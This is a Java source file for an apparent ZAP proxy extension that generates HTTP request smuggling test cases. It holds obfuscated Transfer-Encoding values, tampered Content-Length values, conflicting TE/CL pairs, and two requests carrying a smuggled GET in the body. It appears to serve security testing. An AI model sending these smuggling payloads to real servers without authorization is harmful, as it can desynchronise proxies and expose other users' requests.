package org.zaproxy.zap.extension.hacktor.technique;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import java.util.List;
import java.util.function.BiConsumer;

public class TECLFramingTechniqueBuilder extends AbstractTechniqueBuilder {
    @Override public String getFamily() { return "TE/CL Framing"; }
    @Override public int getOrder() { return 50; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {
        String[] teValues = {
            "chunked","Chunked","CHUNKED","gzip, chunked","identity, chunked",
            "chunked, chunked","xchunked","chunked;foo=bar"," chunked","chunked ",
            "chunked","deflate, chunked","gzip, deflate",
            "chunked; charset=utf-8","Transfer-Encoding: chunked",
            "identity","compress, chunked","gzip, deflate",
            "trailers","chunked; delimiter=x","chunked;x=1"
        };
        for (String te : teValues) {
            final String v = te;
            techs.add(new Technique("TE/CL Framing", "TE:" + te,
                "Transfer-Encoding obfuscation: " + te,
                base -> { HttpMessage c = cloneMsg(base); try { c.getRequestHeader().setHeader("Transfer-Encoding", v); } catch (Exception ignored) {} return c; }));
        }
        String[] clValues = {
            "0","1","2","5","100","999999","-1","-100","0x0","0o0",
            "00"," 0"," 1","0 ","1 ","00000"
        };
        for (String cl : clValues) {
            final String v = cl;
            techs.add(new Technique("TE/CL Framing", "CL:" + cl,
                "Content-Length tampering: " + cl,
                base -> { HttpMessage c = cloneMsg(base); try { c.getRequestHeader().setHeader("Content-Length", v); } catch (Exception ignored) {} return c; }));
        }
        String[][] teclPairs = {
            {"chunked","0"},{"chunked","5"},{"chunked","100"},
            {"gzip, chunked","0"},{"identity","999999"},
            {"chunked","-1"},{"chunked","0x0"},{"chunked"," "},
            {"identity","0"},{"compress, chunked","0"},
            {"gzip","999999"},{"deflate","999999"}
        };
        for (String[] pair : teclPairs) {
            final String te = pair[0], cl = pair[1];
            techs.add(new Technique("TE/CL Framing", "CLTE:" + pair[0] + "/" + pair[1],
                "Conflicting TE+CL: TE=" + pair[0] + " CL=" + pair[1],
                base -> {
                    HttpMessage c = cloneMsg(base);
                    try { c.getRequestHeader().setHeader("Transfer-Encoding", te); c.getRequestHeader().setHeader("Content-Length", cl); } catch (Exception ignored) {}
                    return c; }));
        }
        final String baseCleanFinal = ctx.baseClean;
        techs.add(new Technique("TE/CL Framing", "CL0Body",
            "Content-Length: 0 with smuggled body",
            base -> {
                HttpMessage c = cloneMsg(base);
                try {
                    c.getRequestHeader().setHeader("Content-Length", "0");
                    c.getRequestBody().setBody("GET " + baseCleanFinal + " HTTP/1.1\r\nHost: localhost\r\n\r\n");
                } catch (Exception ignored) {}
                return c; }));
        techs.add(new Technique("TE/CL Framing", "SmugPrefix",
            "Body containing smuggled request prefix",
            base -> {
                HttpMessage c = cloneMsg(base);
                try {
                    c.getRequestHeader().setHeader("Content-Length", "1");
                    c.getRequestBody().setBody("Z" + "GET " + baseCleanFinal + "?smug=1 HTTP/1.1\r\nHost: localhost\r\nX-Smug: 1\r\n\r\n");
                } catch (Exception ignored) {}
                return c; }));
    }
}
